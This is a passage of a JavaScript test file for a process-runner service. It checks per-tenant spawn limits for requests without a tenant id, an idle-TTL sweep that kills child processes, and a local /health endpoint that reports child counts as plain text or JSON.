    assert.equal(runner.children.size, 0);
});

test('requests without a tenant id share the unknown bucket and skip the per-tenant cap', async () => {
    const ws = [];
    for (let i = 0; i < 3; i++) {
        const w = await spawnOverWire({ command: 'node', args: SLEEP });
        await waitFor(w.events, (e) => e.msg && e.msg.type === 'spawned');
        ws.push(w);
    }
    closeAll(...ws);
    await waitEmpty();
});

test('idle sweep kills a child past the idle TTL', async () => {
    const w = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 'idle' });
    await waitFor(w.events, (e) => e.msg && e.msg.type === 'spawned');
    runner.sweep(Date.now() + 60 * 60 * 1000);
    await waitFor(w.events, (e) => e.msg && e.msg.type === 'exit');
    closeAll(w);
});

test('/health?format=json reports child counts; default stays plain ok', async () => {
    const w = await spawnOverWire({ command: 'node', args: SLEEP, tenantId: 'h' });
    await waitFor(w.events, (e) => e.msg && e.msg.type === 'spawned');
    const get = (path) => new Promise((resolve, reject) => {
        require('http').get(`http://127.0.0.1:${TEST_HEALTH_PORT}${path}`, (res) => {
            let b = '';
            res.on('data', (d) => (b += d));
            res.on('end', () => resolve({ status: res.statusCode, body: b }));
        }).on('error', reject);
    });
    assert.equal((await get('/health')).body, 'ok');
    const j = JSON.parse((await get('/health?format=json')).body);
    assert.equal(j.status, 'ok');
    assert.equal(j.children, 1);
    assert.equal(j.perTenant.h, 1);
    closeAll(w);
    await waitEmpty();
});
